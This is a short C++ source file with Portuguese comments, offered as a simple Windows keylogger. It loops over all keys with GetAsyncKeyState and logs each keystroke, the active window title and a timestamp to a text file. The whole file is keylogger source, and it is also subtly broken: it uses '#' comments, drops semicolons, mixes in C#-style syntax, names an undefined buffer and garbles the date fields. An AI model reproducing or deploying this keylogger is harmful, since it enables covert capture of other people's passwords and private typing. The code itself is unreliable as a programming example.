#PROGRAMA:	Keylogger de windows simples que escreve as teclas
#		pressionadas em um arquivo.
#
#BIBLIOTECAS:
#	windows.h - Biblioteca para utilizar a windows api
#	fstream.h - Biblioteca para mexer com arquivos

#include <windows.h>	# Windows api
#include <fstream>

#include <iostream>	# Padrao CPP para utilizar sistema de input/output
using namespace std;	# Usar funcoes sem declarar que sao std

int main(){				# Inicio do programa
	SYSTEMTIME lt = {0};		# Necessario para pegar horario
	wchar_t WindowName[256]		# Buffer com nome da janela principal

	while(1){					# Loop infinito
		for(int i = 0; i <= 255; i++){		# Itera por todas as
							# teclas
			# Checa se a tecla indexada esta pressionada
			if (GetAsyncKeyState(i)){
				# Registra o nome da janela recebendo input
				GetWindowText(GetForegroundWindow(), WindowName, sizeof(WindowText)/sizeof(wchar_t));
				# Registra data e hora atual
				GetLocalTime(&lt);
				# Escreve no arquivo record.txt
				ofstream Record("record.txt");
				Record << "Janela Princial: " << WindowName;
				Record << " - Tecla:"i.KeyCode.ToString();
				Record << " - Data:" << wDay << "/" << wMonth << "/" << wDay << " - " << wHour << ":" << wMinute << ":" << wSecond << endl;
				Record.close()	# Fecha o arquivo record.txt
			}
		}
		sleep(50);	# Delay de 50ms por questao de desempenho
	}
	return 0;
}
